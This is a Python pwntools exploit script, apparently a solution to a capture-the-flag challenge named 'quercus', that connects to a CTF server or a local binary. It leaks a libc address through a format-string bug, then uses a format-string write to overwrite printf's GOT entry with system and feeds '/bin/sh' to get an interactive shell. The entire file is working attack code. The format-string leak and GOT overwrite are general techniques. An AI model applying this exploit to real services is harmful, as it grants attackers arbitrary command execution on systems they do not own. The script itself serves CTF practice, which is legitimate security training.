#!/usr/bin/python3

from pwn import *

exe = ELF('quercus_patched', checksec=False)
libc = ELF("libc.so.6")
context.binary = exe
def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x4012AC
        c
        ''')
        input()


if args.REMOTE:
    p = remote('quercus.squ1rrel-ctf-codelab.kctf.cloud', 1337)
else:
    p = process(exe.path)


def se(pa):
    sla(b'species: ', pa)
    sla(b'edit: ', '1')


se(b'%21$p|')
p.recvuntil(b'1. ')
libc.address = int(p.recvuntil(b'|', drop=True), 16) - 0x24083
info("libc.address " + hex(libc.address))
# GDB()

package = {
    libc.sym.system & 0xffff: exe.got.printf,
    libc.sym.system >> 16 & 0xffff: exe.got.printf+2,
    libc.sym.system >> 32 & 0xffff: exe.got.printf+4,
}
order = sorted(package)

pa = f'%{order[0]}c%17$hn%{order[1]-order[0]}c%18$hn%{order[2]-order[1]}c%19$hn'.encode().ljust(0x38) + \
    p64(next(libc.search(b'/bin/sh')))*4
pa += p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
se(pa)
p.interactive()
